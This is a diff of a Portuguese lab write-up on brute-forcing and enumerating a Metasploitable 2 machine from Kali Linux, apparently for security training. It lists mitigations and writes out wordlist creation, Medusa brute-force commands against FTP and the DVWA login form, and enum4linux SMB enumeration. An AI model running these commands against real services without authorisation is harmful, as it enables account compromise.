@@ -31,7 +31,7 @@ O protocolo de compartilhamento de arquivos do Windows também pode ser alvo. O 
 * Autenticação em dois fatores (2FA)
 * Monitoramento e bloqueio de IPs suspeitos
 
-## Ambiente de Laboratório
+## Ambiente de teste
 
 Utilizei o Kali Linux e o Metasploitable 2 em um ambiente controlado. O Kali Linux foi executado no Hyper-V e o Metasploitable 2 no VirtualBox. Configurei uma rede em ponte entre as duas máquinas virtuais, permitindo comunicação entre elas sem afetar o computador host.
 
@@ -44,6 +44,7 @@ Usei a ferramenta Medusa para testar logins em serviços como FTP, SSH, SMB e We
 ### Criação de Arquivos de Usuários e Senhas Comuns
 
 echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 
 ### Ataque de Força Bruta FTP
@@ -52,14 +53,18 @@ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 3
 
 ### Ataque de Força Bruta Web
 
-medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http 
--m PAGE:'/dvwa/login.php' 
--m FORM:'username=^USER^&password=^PASS^&Login=Login' 
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http
+
+-m PAGE:'/dvwa/login.php'
+
+-m FORM:'username=^USER^&password=^PASS^&Login=Login'
+
 -m 'FAIL=Login failed' -t 6
 
 ### Enumeração SMB
 
 enum4linux -a 192.168.56.101 | tee enum4_output.txt
+
 less enum4_output.txt
 
 ### Acesso utilizando SMBClient
